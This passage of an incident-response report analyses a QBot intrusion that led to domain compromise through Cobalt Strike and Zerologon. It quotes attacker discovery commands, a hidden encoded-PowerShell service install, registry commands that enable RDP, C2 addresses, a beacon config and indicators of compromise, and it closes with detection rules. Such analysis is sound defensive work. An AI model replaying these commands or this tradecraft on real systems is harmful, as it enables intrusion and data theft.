SecureList.\n\n```image\nAlt: System Info\nDescription: The image displays a table containing data related to system commands executed during a cybersecurity event. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory,' listing various commands such as 'whoami /all,' 'ipconfig /all,' and 'nslookup.' Each command is associated with the 'explorer.exe' process, indicating that these commands are part of the discovery phase in a potential attack, reflecting the operational tactics used to gather information about the affected system and network.\nTranscription: |\n  | ParentImage         | CommandLine                                              | TaskCategory                         |\n  | ------------------- | -------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64 | whoami /all                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | cmd /c set                                               | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | ipconfig /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net view /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdc. | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net share                                                | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | route print                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | netstat -nao                                             | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net localgroup                                           | Process Create (rule: ProcessCreate) |\n```\n\nLater, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.\n\n```image\nAlt: Active Directory Discovery\nDescription: The image depicts a table detailing command-line activities related to process creation on a Windows system. It includes columns for 'ParentImage', 'CommandLine', and 'TaskCategory', showing various commands executed, such as retrieving group information from a domain and executing a ping command. This information is relevant for understanding the investigative steps taken during a cybersecurity incident involving QBot.\nTranscription: |\n  | ParentImage                      | CommandLine                                                                               | TaskCategory                         |\n  | -------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain admins\" /domain                                                         | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain controllers\" /domain                                                    | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C ping -n 1                                                  | Process Create (rule: ProcessCreate) |\n```\n\n#### ADFind (renamed in find.exe) used to enumerate computers\n\n```\nC:\\redacted\\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\n```image\nAlt: ADFind\nDescription: The image displays technical information about the tool 'find.exe', which is known as AdFind. It includes details such as the file version (1.52.0.5064), product name (AdFind), company (www.joeware.net), original file name (AdFind.exe), and the command line used to execute the tool. The command line demonstrates how the tool is utilized to enumerate computer objects in an Active Directory environment, specifically fetching attributes like name, common name (cn), operating system, and DNS host name in CSV format.\nTranscription: |\n  Image:                find.exe\n  FileVersion:          1.52.0.5064\n  Description:          -\n  Product:              AdFind\n  Company:              www.joeware.net\n  OriginalFileName:     AdFind.exe\n  CommandLine:          C:\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\nOn the Domain Controller, the threat actors gathered information about the installed security software through WMI:\n\n```image\nAlt: WMI Query\nDescription: The image displays a table containing process creation logs related to a Windows environment. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory.' The 'ParentImage' column indicates the use of PowerShell, while the 'CommandLine' column shows various commands executed via cmd.exe to query security software components using Windows Management Instrumentation (WMI). The 'TaskCategory' column specifies that these actions are categorized as 'Process Create.' This data is relevant for understanding the actions taken by threat actors during a domain compromise.\nTranscription: |\n  | ParentImage                                               | CommandLine                                                                                              | TaskCategory                         |\n  | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value   | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value    | Process Create (rule: ProcessCreate) |\n```\n\n```\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value\n```\n\n#### Ping was used to verify machines were online\n\n```\nping -n 1 [REDACTED]\n```\n\n### Lateral Movement\n\nThrough the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.\n\n```\nEventCode: 7045\nService File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted>\nUser: NT AUTHORITY\\SYSTEM\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe\n```\n\nOn the first Domain Controller, a Cobalt Strike service was installed:\n\n```image\nAlt: Cobalt Strike Service\nDescription: The image displays a Windows Event Log entry with details about a service installation related to a Cobalt Strike operation. Key information includes the EventCode (7045), indicating a service was installed, the Service File Name which shows the command executed (including PowerShell and an encoded command), the User account under which the service was created (LocalSystem), and other attributes like the ComputerName and types of the service. This log entry is crucial for understanding the lateral movement of malware in a network.\nTranscription: |\n  LogName: System\n  EventCode: 7045\n  EventType: 4\n  ComputerName: <redacted>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-Service Control Manager\n  Type: Information\n  RecordNumber: 2730\n  TaskCategory: None\n  OpCode: The operation completed successfully.\n  Message: A service was installed in the system.\n  \n  Service Name: af5ff02\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADOATgB1AHcALQBpAGMAdABlAG8AQgB5AFMAZABhAGUAYQBuAGQAYQAgAGUAbgB0AGUAcgB0AGUAcgB0AGUAcgB0AGUAcgB...\n```\n\n```\nLog Source: Microsoft-Windows-Service Control Manager Event ID:7045\n```\n\nMultiple services were installed by Cobalt Strike across the environment, here are a few examples:\n\n```\nHKLM\\System\\CurrentControlSet\\Services\\3141131\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\af5ff02\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\c46234f\\ImagePath\n```\n\nCobalt Strike first calls `OpenSCManagerW` to create the service remotely, then starts it with `StartServiceA` function:\n\n```image\nAlt: Service Creation\nDescription: The image displays a network packet capture related to the execution of the `OpenSCManagerW` and `StartServiceA` functions, which are part of the Cobalt Strike malware's lateral movement technique. The upper part shows timestamps, source, and destination ports, indicating communication between a compromised host and a domain controller. The lower part provides detailed information about the captured frame, including frame size, Ethernet II details, and the Internet Protocol version 4 data. This image contains technical details pertinent to cyber threat analysis.\nTranscription: |\n  Frame 1306464: 194 bytes on wire (1552 bits), 194 bytes captured (1552 bits)\n  Ethernet II, Src: <redacted>, Dst: <redacted>\n  Internet Protocol Version 4, Src: BeachHead IP, Dst: DC IP\n  Transmission Control Protocol, Src Port: 61768, Dst Port: 49729, Seq: 14613, Ack: 679, Len: 140\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Request, Fragment: Single, Fragment Offset: 0\n  ```\n  \n  ```\n  17:15:47.907308 61768 SVCCtl OpenSCManagerW request\n  17:15:47.908686 49729 SVCCtl OpenSCManagerW response\n  17:15:47.914445 49729 SVCCtl Unknown operation 60 response\n  17:15:47.915546 61768 SVCCtl StartServiceA request\n  17:15:48.031885 49729 SVCCtl StartServiceA response\n```\n\n#### RDP/interactive Logins\n\nVarious commands were executed to enable the RDP service on various hosts:\n\nIncrease the max RDP connections allowed, in this case a arbitrarily large number.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f\n```\n\nMakes sure the RDP listener is enabled.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"fEnableWinStation\" /d 1 /f\n```\n\nMakes sure the user is allowed to RDP to the terminal server.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSUserEnabled\" /d 0 /f\n```\n\nMakes sure the terminal server is set to enabled.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSEnabled\" /d 1 /f\n```\n\nMakes sure terminal services is set to remote admin mode.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAppCompat\" /d 0 /f\n```\n\nMakes sure that the terminal service will start idle sessions.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"IdleWinStationPoolCount\" /d 1 /f\n```\n\nEnables advertisement of the terminal server.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAdvertise\" /d 1 /f\n```\n\nMakes sure terminal server is set to allow connections.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"AllowTSConnections\" /d 1 /f\n```\n\nMakes sure terminal server is set to simultaneous sessions.\n\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /t REG_DWORD /v \"EnableConcurrentSessions\" /d 1 /f\n```\n\nStarts the terminal services and sets service to autostart.\n\n```\nsc config termservice start= auto\nnet  start termservice /y\n```\n\nThe threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.\n\n```image\nAlt: RDP Sessions\nDescription: The image displays a detailed security log entry from a Windows environment, indicating a successful logon event (EventCode=4624) related to Remote Desktop Protocol (RDP). It includes specific logon information such as the security ID, account name, account domain, logon type, and process information. The log indicates that an account was successfully logged on, with notable details about the administrator account used, including its security ID, logon ID, and the process associated with the logon (svchost.exe). This log serves as a crucial piece of information in the context of lateral movement and potential domain compromise scenarios.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=************\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=12572\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID: S-1-5-18\n      Account Name: ************\n      Account Domain: ************\n      Logon ID: 0x3E7\n  \n  Logon Information:\n      Logon Type: 10\n      Restricted Admin Mode: No\n      Virtual Account: No\n      Elevated Token: Yes\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n      Security ID: S-1-5-21-853439379-3680187918-914908032-500\n      Account Name: Administrator\n      Account Domain: ************\n      Logon ID: 0x1213E97\n      Linked Logon ID: 0x0\n      Network Account Name: -\n      Network Account Domain: -\n      Logon GUID: {56eb6b07-4091-d736-d28e-f8ef8d0dc9158}\n  \n  Process Information:\n      Process ID: 0x3c\n      Process Name: C:\\Windows\\System32\\svchost.exe\n```\n\n```\nLogName=Security\nEventCode=4624\nLogon Type=10 (Remote Interactive Logon - RDP)\n```\n\n### Named pipe (SMB)\n\nThe base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe “dce_3d”.\n\n```image\nAlt: SMB Beacon\nDescription: The image shows the output of a CyberChef operation, displaying a base64 decoded payload. The highlighted portion indicates the creation of a named pipe named \"dce_3d\". The surrounding text contains garbled data, typical of decoded binary payloads, potentially representing an SMB beacon.\nTranscription: |\n  üè....`à1òd.R0.R..R.r( .J&1y1A¬<a|, ÁÏ\n  ,ÇàRW.R..B<.D.@x.AtJ.DP.H..X .óá<1.4..Ó1y1¬ÁÍ\n  .Cçàu0.j; }$uÀ.xS.6f.K.x..ó...D.$$$[[ayZQyàX_Z..ë.1]Àj@h....hyÿ..j.hX¤SâyÖPé´...z1éQqh.°..h..°j.j.RhEpÔyÖP..$i.Rh(o)áyÖ.Atnj.j.j..æ.Æ..Â.|$..9At.hòµçVyÖyd$.èsyÿ\\\\.\\pipe\\dce_3d .i .\n```\n\n```image\nAlt: Named Pipe\nDescription: The image displays a log entry related to the creation of a named pipe in a Windows environment. It contains various fields such as LogName, EventCode, ComputerName, User, and more, with specific values indicating the details of the event. Notably, it shows that a pipe named '\\dce_3d' was created by a process with ID 396, which is associated with PowerShell. The log entry format is typical for Windows event logs, providing crucial information for cybersecurity analysis.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=17\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=43747\n  Keywords=None\n  TaskCategory=Pipe Created (rule: PipeEvent)\n  OpCode=Info\n  Message=Pipe Created:\n  RuleName=-\n  EventType=CreatePipe\n  UtcTime=\n  ProcessGuid={3acf9a2a-953e-6192-cd20-00000000000300}\n  ProcessId=396\n  PipeName=\\dce_3d\n  Image: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n```\nLogName=Microsoft-Windows-System/Operational\nEventCode=17\nTaskCategory=Pipe Created (rule: PipeEvent)\n```\n\n### Command and Control\n\n#### QBot details – 24.229.150.54 // 41.228.22.180\n\n24.229.150[.]54:995 / avlhestito[.]us\n\n```\nCertificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce\nNot Before  2021/11/15 09:24:49 UTC\nNot After  2022/11/15 13:18:32 UTC\nIssuer Org  Rsc Inpye LLC.\nSubject Common  avlhestito[.]us\nPublic Algorithm  rsaEncryption\nJA3: c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\n41.228.22[.]180:443 / xrhm[.]info\n\n```\nCertificate:\t96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7\nNot \tBefore:  2021/11/12 04:34:10 UTC\nNot After:  \t2022/11/12 10:08:57 UTC\nIssuer Org:  Bqatra Bamito Inc.\nSubject Common:  xrhm[.]info\nPublic Algorithm:  rsaEncryption\nJA3:  c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\nHere is the initial access DLL (Qbot) information from Tria.ge\n\n```image\nAlt: Qbot DLL\nDescription: The image displays a table containing details about Qakbot (QBot) operations. It includes columns for Family, Version, Botnet, Campaign, and a list of Command and Control (C2) IP addresses with their corresponding ports. Each row represents a different C2 address associated with Qakbot, showcasing the botnet's operational infrastructure.\nTranscription: |\n  Family: qakbot\n  Version: 402.363\n  Botnet: tr\n  Campaign: 1633597626\n  \n  C2:\n  120.150.218.241:995\n  89.137.52.44:443\n  86.8.177.143:443\n  174.54.139.186:443\n  188.50.169.158:443\n  140.82.49.12:443\n  81.241.252.59:2078\n  209.50.20.255:443\n  200.232.214.222:995\n  2.222.167.138:443\n  122.11.220.212:2222\n  47.22.148.6:443\n  217.17.56.163:465\n  94.200.181.154:443\n  201.93.111.2:995\n  89.101.97.139:443\n  188.55.235.118:995\n  181.118.183.94:443\n  186.32.163.199:443\n  76.25.142.196:443\n  98.157.235.126:443\n  73.151.236.31:443\n  75.75.179.226:443\n  67.165.206.193:993\n  72.252.201.69:443\n  185.250.148.74:443\n  66.103.170.104:2222\n  216.201.162.158:443\n  103.123.42.115:2222\n  124.123.42.115:2222\n  199.27.127.129:443\n  209.142.97.161:995\n  73.236.205.91:443\n  103.142.10.177:443\n  41.228.22.180:443\n  78.191.58.219:995\n  74.72.237.54:443\n  96.57.188.174:2078\n  37.210.152.224:995\n  202.134.178.157:443\n  73.52.50.32:443\n  27.223.92.142:995\n  136.236.74.70:443\n  72.173.78.211:443\n  45.46.53.140:2222\n  173.21.10.71:2222\n  71.74.12.34:443\n  167.48.117.81:443\n  47.40.196.233:2222\n  181.4.53.6:465\n```\n\n#### Cobalt Strike details – 5.255.98[.]144\n\nThis Cobalt Strike server was added to our Threat Feed on 2021-11-16.\n\n5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com\n\n```\nCertificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ]\nNot Before: 2021/11/07 03:00:53 UTC  \t\nNot After: 2022/02/05 03:00:52 UTC  \t\nIssuer Org: Let's Encrypt  \t\nSubject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com\nPublic Algorithm: rsaEncryption\nJA3: 0eecb7b1551fba4ec03851810d31743f\nJA3s: ae4edc6faf64d08308082ad26be60767\n```\n\nConfig:\n\n```\n{\n    \"x64\": {\n        \"uri_queried\": \"/tRPG\",\n        \"sha256\": \"dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416040175.3,\n        \"md5\": \"30cc71d5b5d7778774c54486558690d3\",\n        \"sha1\": \"5f36c6cffdbae0d631c8889b4d9bad1248f899b3\"\n    },\n    \"x86\": {\n        \"uri_queried\": \"/Mr0m\",\n        \"sha256\": \"a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416038974.9,\n        \"md5\": \"c1fd49c043894c1dff8bc02b17f8942c\",\n        \"sha1\": \"e915f74be310b1687db6b290af2f78583a981512\"\n    }\n}\n```\n\n### Exfiltration\n\nWhile the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment.\n\n```image\nAlt: Canary Documents\nDescription: The image displays a code snippet featuring details about an IP address (91.193.182.165). It includes information such as city (Moscow), region (Moscow), country (RU), geographical coordinates, organization (AS12722 RECONN LLC), postal code (101000), and timezone (Europe/Moscow). This data is relevant for identifying the origin of suspicious activities in a cybersecurity context.\nTranscription: |\n  ip: \"91.193.182.165\"\n  city: \"Moscow\"\n  region: \"Moscow\"\n  country: \"RU\"\n  loc: \"55.7522,37.6156\"\n  org: \"AS12722 RECONN LLC\"\n  postal: \"101000\"\n  timezone: \"Europe/Moscow\"\n```\n\nThe threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.\n\nThe C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.\n\n```image\nAlt: C2 Channel\nDescription: The image is a bar graph depicting the number of connections per minute from a File Server to a specified command and control IP address (5.255.98.144:8888). The x-axis represents time in UTC from 17:35 to 18:15, while the y-axis indicates the number of connections, ranging from 0 to 20. The graph shows a notable spike in connections at 17:54, which aligns with the timeframe of suspected data exfiltration, demonstrating the activity of a Cobalt Strike Beacon during that period.\nTranscription: |\n  Number of connection to 5.255.98.144:8888 from File Server per minute\n  \n  | Time  | Connections |\n  |-------|-------------|\n  | 17:36 | 1           |\n  | 17:37 | 0           |\n  | 17:38 | 0           |\n  | 17:39 | 5           |\n  | 17:40 | 0           |\n  | 17:41 | 0           |\n  | 17:42 | 0           |\n  | 17:43 | 0           |\n  | 17:44 | 0           |\n  | 17:45 | 0           |\n  | 17:46 | 0           |\n  | 17:47 | 0           |\n  | 17:48 | 0           |\n  | 17:49 | 0           |\n  | 17:50 | 0           |\n  | 17:51 | 0           |\n  | 17:52 | 0           |\n  | 17:53 | 0           |\n  | 17:54 | 18          |\n  | 17:55 | 16          |\n  | 17:56 | 14          |\n  | 17:57 | 12          |\n  | 17:58 | 10          |\n  | 17:59 | 10          |\n  | 18:00 | 10          |\n  | 18:01 | 10          |\n  | 18:02 | 10          |\n  | 18:03 | 10          |\n  | 18:04 | 10          |\n  | 18:05 | 10          |\n  | 18:06 | 10          |\n  | 18:07 | 10          |\n  | 18:08 | 10          |\n  | 18:09 | 10          |\n  | 18:10 | 10          |\n  | 18:11 | 10          |\n  | 18:12 | 10          |\n```\n\nAt 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.\n\nAccording to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.\n\n```image\nAlt: Exfiltration Traffic\nDescription: The image is a time series graph displaying network traffic data related to exfiltration events. The x-axis represents time in UTC, ranging from 17:52:00 to 18:00:00, while the y-axis indicates the volume of data transferred. A significant spike is visible around 17:54:00, indicating a peak in traffic from the file share server to the Cobalt Strike command and control server. The graph uses red bars to highlight the data transfer volumes, suggesting a concentrated effort of data exfiltration occurring within this time frame.\nTranscription: |\n  | Time (UTC) | Connections |\n  |------------|-------------|\n  | 17:52:00   | Low         |\n  | 17:54:00   | High        |\n  | 17:56:00   | Low         |\n  | 17:58:00   | Low         |\n  | 18:00:00   | Low         |\n```\n\nSpike in traffic from file share server to Cobalt Strike command and control server.\n\n### IOCs\n\n#### Network\n\n```\nQBOT\n24.229.150[.]54:995  - avlhestito[.]us\n41.228.22[.]180:443 - xrhm[.]info\n\nCobalt Strike\n5.255.98[.]144:8888 / dxabt[.]com\n5.255.98[.]144:443 / dxabt[.]com\n5.255.98[.]144:8080 / dxabt[.]com\n```\n\n#### File\n\n```\nIntial Exec Qbot DLL\nMD5:53510e20efb161d5b71c4ce2800c1a8d\nSHA1:2268178851d0d0debb9ab457d73af8a5e50af168\nSHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\n\nQBot DLL (extracted from registry):\nMD5:312e52b4109741893f17bc524084100f\nSHA1:7ca650945223eab088f43fd472e3592be2ed9d32\nSHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\n\ncool.exe\nMD5:59E7F22D2C290336826700F05531BD30\nSHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1\nSHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0\n```\n\n## Detections\n\n### Network\n\n```\nET POLICY Powershell Activity Over SMB - Likely Lateral Movement\nET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\nET CNC Feodo Tracker Reported CnC Server group 15\nET CNC Feodo Tracker Reported CnC Server group 16\n\nThe following rules may cause performance issues (and are disabled by default) according to @ET_Labs\nET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870\nET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889\n```\n\nNew signatures\n\n```\n2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)\n2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472)\n```\n\n### Sigma\n\n```\ntitle: Scheduled task executing powershell encoded payload from registry\nstatus: Experimental\ndescription: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/Create'\n      - '/SC'\n  selection2:\n    CommandLine|contains|all:\n      - 'FromBase64String'\n      - 'powershell'\n      - 'Get-ItemProperty'\n      - 'HKCU:'\n  condition: selection1 and selection2\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.t1053.005\n  - attack.t1059.001\n```\n\n```\ntitle: Execution of ZeroLogon PoC executable\nstatus: Experimental\ndescription: Detects the execution of the commonly used ZeroLogon PoC executable.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    ParentImage|endswith:\n      - '\\cmd.exe'\n    Image|endswith:\n      - '\\cool.exe'\n      - '\\zero.exe'\n    CommandLine|contains|all:\n      - 'Administrator'\n      - '-c'\n  selection2:\n    CommandLine|contains|all:\n      - 'taskkill'\n      - '/f'\n      - '/im'\n  selection3:\n    CommandLine|contains:\n      - 'powershell'\n  condition: selection1 and (selection2 or selection3)\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.lateral_movement\n  - attack.T1210\n```\n\n```\ntitle:  Enabling RDP service via reg.exe command execution\nstatus: Experimental\ndescription: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith:\n      - '\\reg.exe'\n    CommandLine|contains|all:\n      - 'add'\n      - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server'\n      - 'REG_DWORD'\n  Winstations1:\n    CommandLine|contains:\n      - 'WinStations\\RDP-Tcp'\n  Winstations2:\n    CommandLine|contains:\n      - 'MaxInstanceCount'\n      - 'fEnableWinStation'\n  selection2:\n    CommandLine|contains|all:\n      - 'Licensing Core'\n      - 'EnableConcurrentSessions'\n  selection3:\n    CommandLine|contains:\n      - 'TSUserEnabled'\n      - 'TSEnabled'\n      - 'TSAppCompat'\n      - 'IdleWinStationPoolCount'\n      - 'TSAdvertise'\n      - 'AllowTSConnections'\n      - 'fSingleSessionPerUser'\n  condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3))\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.defense_evasion\n  - attack.lateral_movement\n  - attack.t1021.001\n  - attack.t1112\n```\n\n- https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml\n- https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml\n- 